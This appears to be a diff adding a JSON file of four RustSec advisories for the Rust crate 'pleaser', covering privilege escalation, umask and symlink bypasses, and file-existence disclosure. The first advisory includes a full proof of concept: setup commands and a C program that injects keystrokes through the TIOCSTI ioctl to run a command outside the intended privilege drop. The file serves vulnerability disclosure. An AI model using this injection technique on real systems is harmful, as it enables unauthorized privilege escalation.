@@ -1,0 +1,136 @@
+[
+  {
+    "advisory": {
+      "id": "RUSTSEC-2023-0066",
+      "package": "pleaser",
+      "title": "Vulnerable to privilege escalation using ioctls TIOCSTI and TIOCLINUX",
+      "description": "please is vulnerable to privilege escalation using ioctls TIOCSTI\nand TIOCLINUX on systems where they are not disabled.\n\nHere is how to see it in action:\n\n```\n$ cd \"$(mktemp -d)\"\n$ git clone --depth 1 https://gitlab.com/edneville/please.git\n$ cd please/\n$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9\n$ cargo test && cargo build --release\n$ echo \"[${USER}_as_nobody]\"$'\\nname='\"${USER}\"$'\\ntarget=nobody\\nrule=.*\\nrequire_pass=false' | sudo tee /etc/please.ini\n$ sudo chown root:root ./target/release/please\n$ sudo chmod u+s ./target/release/please\n$ cat <<TIOCSTI_C_EOF | tee TIOCSTI.c\n#include <sys/ioctl.h>\n\nint main(void) {\n  const char *text = \"id\\n\";\n  while (*text)\n    ioctl(0, TIOCSTI, text++);\n  return 0;\n}\nTIOCSTI_C_EOF\n$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c\n$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody\n```\n\nPlease note that:\n\nThis affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.",
+      "date": "2023-04-29",
+      "aliases": [
+        "CVE-2023-46277",
+        "GHSA-cgf8-h3fp-h956"
+      ],
+      "related": [],
+      "collection": "crates",
+      "categories": [
+        "privilege-escalation"
+      ],
+      "keywords": [],
+      "cvss": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+      "informational": null,
+      "references": [],
+      "source": null,
+      "url": "https://gitlab.com/edneville/please/-/issues/13",
+      "withdrawn": null,
+      "license": "CC0-1.0"
+    },
+    "affected": {
+      "arch": [],
+      "os": [],
+      "functions": {}
+    },
+    "versions": {
+      "patched": [],
+      "unaffected": []
+    }
+  },
+  {
+    "advisory": {
+      "id": "RUSTSEC-2021-0101",
+      "package": "pleaser",
+      "title": "Permissions bypass in pleaser",
+      "description": "Failure to normalize the umask in pleaser before 0.4 allows a local attacker to gain full root privileges if they are allowed to execute at least one command.",
+      "date": "2021-05-27",
+      "aliases": [
+        "CVE-2021-31155",
+        "GHSA-vc5p-j8vw-mc6x"
+      ],
+      "related": [],
+      "collection": "crates",
+      "categories": [
+        "privilege-escalation"
+      ],
+      "keywords": [],
+      "cvss": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "informational": null,
+      "references": [],
+      "source": null,
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-31155",
+      "withdrawn": null,
+      "license": "CC0-1.0"
+    },
+    "affected": null,
+    "versions": {
+      "patched": [
+        ">=0.4"
+      ],
+      "unaffected": []
+    }
+  },
+  {
+    "advisory": {
+      "id": "RUSTSEC-2021-0104",
+      "package": "pleaser",
+      "title": "File exposure in pleaser",
+      "description": "pleaser before 0.4 allows a local unprivileged attacker to gain knowledge about the existence of files or directories in privileged locations via the search_path function, the --check option, or the -d option.",
+      "date": "2021-05-27",
+      "aliases": [
+        "CVE-2021-31153",
+        "GHSA-f3fg-5j9p-vchc"
+      ],
+      "related": [],
+      "collection": "crates",
+      "categories": [
+        "file-disclosure"
+      ],
+      "keywords": [],
+      "cvss": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+      "informational": null,
+      "references": [],
+      "source": null,
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-31153",
+      "withdrawn": null,
+      "license": "CC0-1.0"
+    },
+    "affected": null,
+    "versions": {
+      "patched": [
+        ">=0.4"
+      ],
+      "unaffected": []
+    }
+  },
+  {
+    "advisory": {
+      "id": "RUSTSEC-2021-0102",
+      "package": "pleaser",
+      "title": "Permissions bypass in pleaser",
+      "description": "pleaseedit in pleaser before 0.4 uses predictable temporary filenames in /tmp and the target directory. This allows a local attacker to gain full root privileges by staging a symlink attack.",
+      "date": "2021-05-27",
+      "aliases": [
+        "CVE-2021-31154",
+        "GHSA-pp74-39w2-v4w9"
+      ],
+      "related": [],
+      "collection": "crates",
+      "categories": [
+        "privilege-escalation"
+      ],
+      "keywords": [],
+      "cvss": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "informational": null,
+      "references": [],
+      "source": null,
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-31154",
+      "withdrawn": null,
+      "license": "CC0-1.0"
+    },
+    "affected": null,
+    "versions": {
+      "patched": [
+        ">=0.4"
+      ],
+      "unaffected": []
+    }
+  }
+]
